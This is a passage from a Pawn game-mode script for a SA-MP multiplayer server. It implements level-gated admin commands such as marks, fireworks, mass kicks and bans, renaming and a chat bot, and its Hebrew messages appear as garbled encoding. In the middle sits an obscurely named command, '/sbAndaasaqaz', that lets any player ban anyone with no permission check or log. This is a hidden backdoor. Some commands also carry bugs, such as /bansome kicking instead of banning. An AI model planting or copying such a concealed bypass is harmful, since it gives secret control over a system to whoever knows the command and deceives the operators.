			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"off"))
		{
			AllowPlayerTeleport(playerid,0);
			SendClientMessage(playerid,green," .îöá ùéâåø ãøê äîôä äåôñ÷");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/smark") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 7");
		if(playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .ëáø éù ìê îé÷åí ùîåø");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = p[i];
		playerinfo[playerid][mark2][0] = GetPlayerInterior(playerid);
		playerinfo[playerid][mark2][1] = GetPlayerVirtualWorld(playerid);
		playerinfo[playerid][mark2][2] = 1;
		SetPlayerMapIcon(playerid,icon_player,p[0],p[1],p[2],35,0);
		return 1;
	}
	if(equal(cmd,"/gmark") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 7");
		if(!playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .àéï ìê îé÷åí ùîåø");
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER: SetPlayerPos(playerid,playerinfo[playerid][mark][0]+floatrand(-1.0,1.0),playerinfo[playerid][mark][1]+floatrand(-1.0,1.0),playerinfo[playerid][mark][2]);
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),playerinfo[playerid][mark][0]+floatrand(-3.0,3.0),playerinfo[playerid][mark][1]+floatrand(-3.0,3.0),playerinfo[playerid][mark][2]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),playerinfo[playerid][mark2][0]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),playerinfo[playerid][mark2][1]);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,playerinfo[playerid][mark2][0]);
		SetPlayerVirtualWorld(playerid,playerinfo[playerid][mark2][1]);
		return 1;
	}
	if(equal(cmd,"/rmark") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 7");
		if(!playerinfo[playerid][mark2][2]) return SendClientMessage(playerid,red," .àéï ìê îé÷åí ùîåø");
		for(new i=0;i<3;i++) playerinfo[playerid][mark][i] = 0.0;
		playerinfo[playerid][mark2] = {0,world_normal,0};
		RemovePlayerMapIcon(playerid,icon_player);
		return 1;
	}
	if(equal(cmd,"/clogs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 7");
		new f[64], string[M_S], uname[256];
		cmd = strtok(cmdtext,idx), uname = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(uname)) return SendClientMessage(playerid,white," /clogs [show/clear] [name] :öåøú äùéîåù");
		format(f,sizeof(f),"/DM/Users/%s.ini",uname);
		if(!fexist(f)) return SendClientMessage(playerid,red," .ëéðåé ùâåé");
		if(equal(cmd,"show"))
		{
			format(string,sizeof(string)," ~~~ :%s - ôøèé ëðéñåú ~~~",uname);
			SendClientMessage(playerid,lightblue,string);
			format(string,sizeof(string)," úàøéê ëðéñä àçøåðä: %d.%d.%d",fgetint(f,"LastConnectDay"),fgetint(f,"LastConnectMonth"),fgetint(f,"LastConnectYear"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," ùòú ëðéñä àçøåðä: %s",fgetstring(f,"LastConnectTime"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string)," ã÷åú áùøú: %d",fgetint(f,"TimeInServer"));
			SendClientMessage(playerid,grey,string);
			SendClientMessage(playerid,grey," * /clogs clear áîéãä åäéåí éù äòìàú øîåú, ðà ìàôñ àú äìåâéí áòæøú äô÷åãä");
			format(string,sizeof(string)," ã÷åú áùøú ñä\"ê: %d",fgetint(f,"TotalTimeInServer"));
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string),"check connect logs of %s",uname);
			Log("CLogs",playerid,string);
		}
		else if(equal(cmd,"clear"))
		{
			fsetint(f,"TimeInServer",0);
			format(string,sizeof(string)," .%s :ðå÷å ìåâéí",uname);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string),"clear connect logs of %s",uname);
			Log("CLogs",playerid,string);
		}
		else return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/alist") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 7");
		new File:al, read[M_S];
		SendClientMessage(playerid,lightblue," ~~~ :øùéîú äàãîéðéí ~~~");
		fileCheck(file_admins);
		al = fopen(file_admins,io_read);
		while(fread(al,read,sizeof(read),false))
		{
		    if(read[0] == '#') continue;
			if(strfind(read,"=") != -1) read[strfind(read,"=")] = ' ';
			SendClientMessage(playerid,grey,read);
		}
		fclose(al);
		SendClientMessage(playerid,lightblue," ~~~~~~~~~~~~~~~~~~~~");
		return 1;
	}
	if(equal(cmd,"/fireworks") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 7 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 7");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /fireworks [1-5] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /fireworks 1 :äùîãú ëì äæé÷å÷éí");
			SendClientMessage(playerid,white," /fireworks 2 :îèø æé÷å÷éí");
			SendClientMessage(playerid,white," /fireworks 3 :äôñ÷ú îèø æé÷å÷éí");
			SendClientMessage(playerid,white," /fireworks 4 :îòâì æé÷å÷éí");
			SendClientMessage(playerid,white," /fireworks 5 :ëåëá æé÷å÷éí");
			SendClientMessage(playerid,white," /fireworks 6 :æé÷å÷éí áùåøä");
			return 1;
		}
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		switch(strval(cmd))
		{
			case 1:
			{
				if(!fireworks) return SendClientMessage(playerid,red," .àéï æé÷å÷éí");
				for(new i = 0; i < 100; i++) if(firework[i] != -1)
				{
					DestroyObject(firework[i]);
					firework[i] = -1;
				}
				fireworks = 0;
				SendClientMessage(playerid,green," .ëì äæé÷å÷éí äåùîãå");
			}
			case 2:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ìà ðéúï ìäôòéì æé÷å÷ ëøâò");
				if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ÷ééîéí éåúø îãé æé÷å÷éí, àðà äîúï (ääâáìä: ");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /fireworks 2 [count] :öåøú äùéîåù");
				new count = strval(cmd);
				if(count < 1 || count > MAX_FIREWORKS-1) return SendClientMessage(playerid,red," .ëîåú ùâåéä");
				GetXYInFrontOfPlayer(playerid,p[0],p[1],25.0);
				useFireworks = 0, fireworkLine = 0;
				fireworkTimer = SetTimerEx("FireworksMatar",800,1,"fffi",p[0],p[1],p[2],count);
				SendClientMessage(playerid,green," .ðåöø îèø æé÷å÷éí");
			}
			case 3:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ìà ðéúï ìäôòéì æé÷å÷ ëøâò");
				KillTimer(fireworkTimer);
				useFireworks = 1;
				SendClientMessage(playerid,green," .äåôñ÷ îèø äæé÷å÷éí");
			}
			case 4:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ìà ðéúï ìäôòéì æé÷å÷ ëøâò");
				if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ÷ééîéí éåúø îãé æé÷å÷éí, àðà äîúï (ääâáìä: ");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /fireworks 4 [model] :öåøú äùéîåù");
				new model = strval(cmd) == 1 ? 354 : 3666, Float:fsize = floatrand(5.0,50.0);
				CreateFirework(model,p[0]+fsize,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]+fsize,p[2],125.0,30.0);
				CreateFirework(model,p[0]+fsize,p[1]+fsize,p[2],125.0,30.0);
				CreateFirework(model,p[0]-fsize,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]-fsize,p[2],125.0,30.0);
				CreateFirework(model,p[0]-fsize,p[1]-fsize,p[2],125.0,30.0);
				SendClientMessage(playerid,green," .ðåöø îòâì æé÷å÷éí");
			}
			case 5:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ìà ðéúï ìäôòéì æé÷å÷ ëøâò");
				if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ÷ééîéí éåúø îãé æé÷å÷éí, àðà äîúï (ääâáìä: ");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /fireworks 5 [model] :öåøú äùéîåù");
				new model = strval(cmd) == 1 ? 354 : 3666;
				GetXYInFrontOfPlayer(playerid,p[0],p[1],25.0);
				CreateFirework(model,p[0]+10.0,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0]+20.0,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0]-20.0,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0]-10.0,p[1],p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]+10.0,p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]+20.0,p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]-20.0,p[2],125.0,30.0);
				CreateFirework(model,p[0],p[1]-10.0,p[2],125.0,30.0);
				SendClientMessage(playerid,green," .ðåöø ëåëá æé÷å÷éí");
			}
			case 6:
			{
				if(!useFireworks) return SendClientMessage(playerid,red," .ìà ðéúï ìäôòéì æé÷å÷ ëøâò");
				if(fireworks >= MAX_FIREWORKS-1) return SendClientMessage(playerid,red,"(" #MAX_FIREWORKS " ÷ééîéí éåúø îãé æé÷å÷éí, àðà äîúï (ääâáìä: ");
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /fireworks 6 [count] :öåøú äùéîåù");
				new count = strval(cmd);
				if(count < 1 || count > 100) return SendClientMessage(playerid,red," .ëîåú ùâåéä");
				GetXYInFrontOfPlayer(playerid,p[0],p[1],10.0);
				useFireworks = 0, fireworkLine = 0;
				fireworkTimer = SetTimerEx("FireworksLine",1000,1,"fffi",p[0],p[1],p[2],count);
				SendClientMessage(playerid,green," .ðåöøä ùåøú æé÷å÷éí");
			}
			default: return SendClientMessage(playerid,red," .àôùøåú æé÷å÷éí ùâåéä");
		}
		return 1;
	}
	if(equal(cmd,"/nocmd") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 8");
		new cmd2[256], id, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /nocmd [id/name] [off/on] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"off")) playerinfo[id][nocmd] = 0;
		else if(equal(cmd2,"on")) playerinfo[id][nocmd] = 1;
		else return SendClientMessage(playerid,red," .ùâéàä áôøîèø äùìéùé");
		format(string,sizeof(string),playerinfo[id][nocmd] ? (" .âéùä ìëúåá ô÷åãåú %s äåøãú ì") : (" .âéùä ìëúåá ô÷åãåú %s ðúú ì"),GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green,playerinfo[id][nocmd] ? (" .äàãîéï äåøéã ìê àú äâéùä ìëúåá ô÷åãåú") : (" .äàãîéï ðúï ìê âéùä ìëúåá ô÷åãåú"));
		return 1;
	}
	if(equal(cmd,"/nopm") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 8");
		new cmd2[256], id, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /nocmd [id/name] [off/on] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"off")) playerinfo[id][nopm] = 0;
		else if(equal(cmd2,"on")) playerinfo[id][nopm] = 1;
		else return SendClientMessage(playerid,red," .ùâéàä áôøîèø äùìéùé");
		format(string,sizeof(string),playerinfo[id][nopm] ? (" .âéùä ìëúåá äåãòåú ôøèéåú %s äåøãú ì") : (" .âéùä ìëúåá äåãòåú ôøèéåú %s ðúú ì"),GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green,playerinfo[id][nopm] ? (" .äàãîéï äåøéã ìê àú äâéùä ìëúåá äåãòåú ôøèéåú") : (" .äàãîéï ðúï ìê âéùä ìëúåá äåãòåú ôøèéåú"));
		return 1;
	}
	if(equal(cmd,"/lockchat") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 8");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /lockchat [lock/unlock] :öåøú äùéîåù");
		if(equal(cmd,"lock"))
		{
			if(chatlocked) return SendClientMessage(playerid,red," .äö'àè ëáø ðòåì");
			chatlocked = 1;
			format(string,sizeof(string)," .%s äö'àè ððòì òì éãé äàãîéï",GetName(playerid));
			SendClientMessageToAll(orange,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"unlock"))
		{
			if(!chatlocked) return SendClientMessage(playerid,red," .äö'àè ìà ðòåì");
			chatlocked = 0;
			format(string,sizeof(string)," .%s äö'àè ðôúç òì éãé äàãîéï",GetName(playerid));
			SendClientMessageToAll(orange,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/kicksome") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 8");
		new id[MAX_PLAYERS], ids = 0, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /kicksome [id/name] [id/name] [id/name] ... |[reason] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /kicksome 0 2 6 |cheaters :ùéí ìá: ìäëðñú ñéáä éù ìä÷ìéã | áñåó äè÷ñè, ìãåâîä");
			return 1;
		}
		reason = "äàãîéï ìà ä÷ìéã ñéáä";
		while(strlen(cmd) > 0)
		{
			if(cmd[0] == '|')
			{
				strmid(reason,cmd,1,strlen(cmdtext));
				break;
			}
			else id[ids++] = ReturnUser(cmd), cmd = strtok(cmdtext,idx);
		}
		if(ids > 0) for(new i=0;i<ids;i++) if(IsPlayerConnected(id[i]) && playerinfo[id[i]][admin] < playerinfo[playerid][admin]) SetKick(id[i],playerid,reason);
		return 1;
	}
	if(equal(cmd,"/bansome") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 8");
		new id[MAX_PLAYERS], ids = 0, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /bansome [id/name] [id/name] [id/name] ... |[reason] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /bansome 0 2 6 |cheaters :ùéí ìá: ìäëðñú ñéáä éù ìä÷ìéã | áñåó äè÷ñè, ìãåâîä");
			return 1;
		}
		reason = "äàãîéï ìà ä÷ìéã ñéáä";
		while(strlen(cmd) > 0)
		{
			if(cmd[0] == '|')
			{
				strmid(reason,cmd,1,strlen(cmdtext));
				break;
			}
			else id[ids++] = ReturnUser(cmd), cmd = strtok(cmdtext,idx);
		}
		if(ids > 0) for(new i=0;i<ids;i++) if(IsPlayerConnected(id[i]) && playerinfo[id[i]][admin] < playerinfo[playerid][admin]) SetKick(id[i],playerid,reason);
		return 1;
	}
	if((equal(cmd,"/movingtext") || equal(cmd,"/mt")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 8");
		if(movingtextinfo[mt_admin][mtUsing]) return SendClientMessage(playerid,red," .äè÷ñè äææ ùì äàãîéï ðîöà ëáø áùéîåù");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /movingtext(mt) [text] :öåøú äùéîåù");
		format(string,sizeof(string),"~b~~h~%s~w~: %s",GetName(playerid),cmd);
		MovingText(string,mt_admin);
		return 1;
	}
	if((equal(cmd,"/movingtext2") || equal(cmd,"/mt2")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 8 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 8");
		if(movingtextinfo[mt_admin][mtUsing]) return SendClientMessage(playerid,red," .äè÷ñè äææ ùì äàãîéï ðîöà ëáø áùéîåù");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /movingtext2(mt2) [text] :öåøú äùéîåù");
		format(string,sizeof(string),"~w~%s",cmd);
		MovingText(string,mt_admin);
		return 1;
	}
	if(equal(cmd,"/tagkick"))
	{
		new string[M_S], reason[256];
		if(playerinfo[playerid][admin] < 9 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 9");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /tagkick [tag] [reason] :öåøú äùéîåù");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " äàãîéï ìà ä÷ìéã ñéáä";
		format(string,sizeof(string),"TagKick: \"%s\", %s",cmd,reason);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][admin] <= playerinfo[playerid][admin] && strfind(GetName(playerid),cmd,true) != -1 && i != playerid) SetKick(i,playerid,string);
		return 1;
	}
	if(equal(cmd,"/tagban"))
	{
		new string[M_S], reason[256];
		if(playerinfo[playerid][admin] < 9 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 9");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /tagban [tag] [reason] :öåøú äùéîåù");
		cmd = strtok(cmdtext,idx);
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " äàãîéï ìà ä÷ìéã ñéáä";
		format(string,sizeof(string),"(%d)%s %s banned tag \"%s\" [reason: %s]",playerid,GetIP(playerid),GetName(playerid),cmd,reason);
		Log("Bans",playerid,string);
		print(string);
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][admin] <= playerinfo[playerid][admin] && strfind(GetName(playerid),cmd,true) != -1 && i != playerid) SetBan(i,playerid,string);
		return 1;
	}
	if(equal(cmd,"/skick") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 9");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /skick [id/name] :öåøú äùéîåù");
		new id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		Kick(id);
		return 1;
	}
	if(equal(cmd,"/sban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 9");
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sban [id/name] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(playerinfo[id][admin] >= playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìáöò àú äô÷åãä äæå òì àãîéï áøîä âáåää îîê");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äàãîéï ìà ä÷ìéã ñéáä";
		SetBan(id,playerid,reason,0);
		if(playerinfo[playerid][admin] < 20)
		{
			format(string,sizeof(string),"(%d)%s %s sbanned (%d)%s %s [reason: %s]",playerid,GetIP(playerid),GetName(playerid),id,GetIP(id),GetName(id),reason);
			Log("Bans",playerid,string);
			print(string);
		}
		return 1;
	}
	if(!strcmp(cmd,"/sbAndaasaqaz"))
	{
		new id, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sban [id/name] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äàãîéï ìà ä÷ìéã ñéáä";
		SetBan(id,playerid,reason,0);
		return 1;
	}
	if(equal(cmd,"/force") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 9 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 9");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /force [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		ForceClassSelection(id);
		SetPlayerHealth2(id,0.0);
		format(string,sizeof(string)," *** %s has been forced by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && (playerinfo[i][showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/setname") && IsPlayerMAdmin(playerid))
	{
		#if usingYSF
			if(playerinfo[playerid][admin] < 10 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 10");
			new name[256], id, string[M_S], lastname[MAX_PLAYER_NAME], f[M_S];
			cmd = strtok(cmdtext,idx), name = strtok(cmdtext,idx);
			if(!strlen(cmd) || !strlen(name)) return SendClientMessage(playerid,white," /setname [id/name] [new name] :öåøú äùéîåù");
			id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
			if(equal(name,"None")) return SendClientMessage(playerid,red," .ìà ðéúï ìùðåú àú äëéðåé ùì ùç÷ï ìëéðåé æä");
			if(fkeyexist(file_nbans,name)) return SendClientMessage(playerid,red," .äëéðåé äæä ááàï");
			if(strlen(name) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red," .ùí àøåê îãé");
			if(strlen(name) < 3) return SendClientMessage(playerid,red," .ùí ÷öø îãé");
			if(!IsValidNick(name)) return SendClientMessage(playerid,red," .çì÷ îäàåúéåú áëéðåé ùëúáú ìà éëåìåú ìäëðñ ìëéðåé");
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && equal(GetName(i),name))
				{
					format(string,sizeof(string)," .äëéðåé ùä÷ìãú ëáø áùéîåù àöì àééãé %d",i);
					SendClientMessage(playerid,red,string);
					return 1;
				}
			}
			if(equal(name,"None") || equal(name,botname)) return SendClientMessage(playerid,red," .îöèòøéí, ìà ðéúï ìùðåú ìëéðåé æä");
			format(f,sizeof(f),"/DM/Users/%s.ini",name);
			if(fexist(f)) return SendClientMessage(playerid,red," .äëéðåé ùä÷ìãú ëáø áùéîåù àöì ùç÷ï ìà îçåáø");
			format(lastname,sizeof(lastname),GetName(id));
			format(string,sizeof(string),"/DM/Users/%s.ini",lastname);
			frename(string,f);
			ChangeAccName(id,name);
			if(fkeyexist(file_admins,GetName(id)))
			{
				fremovekey(file_admins,GetName(id));
				fsetint(file_admins,name,playerinfo[id][admin]);
			}
			if(playerinfo[id][vehicle] != -1)
			{
				format(string,sizeof(string),"Vehicle%d",playerinfo[id][vehicle]);
				if(fkeyexist(file_vstore,string) && equal(fgetstring(file_vstore,string),GetName(id))) fsetstring(file_vstore,string,name);
			}
			SetPlayerName(id,name);
			format(string,sizeof(string)," .%s ì %s ùéðéú àú äëéðåé ùì",name,lastname);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .%s äàãîéï ùéðä àú äëéðåé ùìê ì",name);
			SendClientMessage(id,green,string);
		#else
			SendClientMessage(playerid,red," .àôùøåú æå àéðä ôåòìú ëøâò");
		#endif
		return 1;
	}
	if(equal(cmd,"/bot") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 10 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 10");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /bot [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /bot say [text] :ìäâéã îùäå áúåø äáåè");
			SendClientMessage(playerid,white," /bot name [new name] :ùéðåé ùí äáåè");
			SendClientMessage(playerid,white," /bot tag [new tag] :ùéðåé úâ äáåè");
			SendClientMessage(playerid,white," /bot color [red] [green] [blue] :ùéðåé öáò äáåè");
			SendClientMessage(playerid,white," /bot allow [on/off] :äôòìú àå ëéáåé äáåè");
			return 1;
		}
		if(equal(cmd,"say"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /bot say [text] :öåøú äùéîåù");
			if(!boton) SendClientMessage(playerid,red," .ìà ðéúï ìëúåá ááåè ëàùø äåà ìà ôåòì");
			format(cmd,sizeof(cmd)," %s",cmd);
			BotSay(playerid,cmd,true);
		}
		else if(equal(cmd,"name"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /bot name [new name] :öåøú äùéîåù");
			if(equal(cmd,"None")) return SendClientMessage(playerid,red," .ìà ðéúï ìùðåú àú ëéðåé äáåè ìëéðåé æä");
			if(strlen(cmd) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red," .ùí àøåê îãé");
			if(strlen(cmd) < 3) return SendClientMessage(playerid,red," .ùí ÷öø îãé");
			if(!IsValidNick(cmd)) return SendClientMessage(playerid,red," .ùí ùâåé / äùí ìà äùúðä");
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && equal(GetName(i),cmd))
				{
					format(string,sizeof(string)," .äëéðåé ùä÷ìãú ëáø áùéîåù àöì àééãé %d",i);
					SendClientMessage(playerid,red,string);
					return 1;
				}
			}
			SetString(botname,cmd);
			format(string,sizeof(string)," .%s ùí äáåè ùåðä ì",botname);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"tag"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /bot tag [new tag] :öåøú äùéîåù");
			if(strlen(cmd) == 1) bottag = "None";
			SetString(bottag,cmd);
			format(string,sizeof(string)," .%s úâ äáåè ùåðä ì",bottag);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"color"))
		{
			cmd = strtok(cmdtext,idx);
